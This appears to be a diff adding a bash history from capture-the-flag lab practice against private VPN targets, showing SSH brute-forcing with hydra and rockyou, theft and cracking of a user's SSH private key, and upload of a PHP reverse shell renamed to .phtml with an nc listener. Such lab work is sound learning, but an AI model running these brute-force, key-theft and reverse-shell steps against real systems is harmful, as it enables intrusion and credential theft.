@@ -1,0 +1,49 @@
+﻿    1  passwd=[REDACTED]
+    2  sudo apt update && sudo apt full-upgrade -y
+    3  nmap --version
+    4  Actualización de sudo apt && sudo apt upgrade
+    5  sudo apt update && sudo apt full-upgrade -y
+    7  ip addr show tun0
+    8  sudo openvpn --config ~/Downloads/tu-usuario.ovpn
+    9  ls ~/Downloads
+   10  find / -name "*.ovpn" 2>/dev/null
+   11  sudo openvpn --config ~/Downloads/
+   15  curl -I http://10.64.163.92/struts2-rest-showcase/
+   16  curl http://10.64.163.92/development/
+   17  curl http://10.64.163.92/development/j.txt
+   18  searchsploit openssh 8.2
+   19  hydra -l j -P /usr/share/wordlists/rockyou.txt ssh://10.64.163.92 -t 4
+   24  ssh j@10.64.163.92
+   25  hydra -l j -P /usr/share/wordlists/fasttrack.txt ssh://10.64.163.92 -t 4
+   28  nmap -sC -sV -oN bitacora/nmap_inicial.txt 10.64.163.92
+   36  searchsploit struts 2.5
+   40  enum4linux -U 10.64.146.168
+   41  rpcclient -U "" -N 10.64.146.168
+   42  smbclient -L 10.64.146.168 -N
+   43  smbclient //10.64.146.168/Anonymous -N
+   49  cat staff.txt
+   50  hydra -l jan -P /usr/share/wordlists/fasttrack.txt ssh://10.64.146.168 -t 4
+   52  hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.64.146.168 -t 16
+   53  head -n 100000 /usr/share/wordlists/rockyou.txt > top100k.txt && hydra -l jan -P top100k.txt ssh://10.64.146.168 -t 16
+   61  ssh armando@10.64.146.168
+   62  ssh jan@10.64.146.168
+   64  scp jan@10.64.146.168:/home/kay/.ssh/id_rsa ./kay_id_rsa
+   66  ssh2john kay_id_rsa > kay_hash.txt
+   70  john --wordlist=/usr/share/wordlists/fasttrack.txt kay_hash.txt
+   72  john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
+   73  ssh -i kay_id_rsa kay@10.64.146.168
+   78  nmap -sC -sV -oN bitacora/nmap_vulnversity.txt 10.66.176.178
+   82  nmap -sC -sV -Pn -oN bitacora/nmap_vulnversity.txt 10.66.176.178
+   83  nmap -sC -sV -Pn -p- -oN bitacora/nmap_vulnversity_full.txt 10.66.176.178
+   87  gobuster dir -u http://10.66.176.178:3333 -w /usr/share/wordlists/dirb/common.txt -o bitacora/gobuster_vulnversity.txt
+   90  cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+   95  nmap -sC -sV -Pn -oN bitacora/nmap_vulnversity_v2.txt 10.66.151.117
+   98  nc -lvnp 1234
+  104  cp shell.php shell.phtml
+  112  nmap -sC -sV -Pn -p 21,22,139,445,3128,3333 10.66.178.40
+  114  searchsploit -x linux/local/21229.txt
+  116  sudo -l
+  122  whoami
+  126  sudo kill -9 121644 121646 121647
+  128  sudo ip link delete tun0
+  129  sudo openvpn --config ~/Downloads/us-east-1-zapatamaximilianp-regular.ovpn --allow-deprecated-insecure-static-crypto
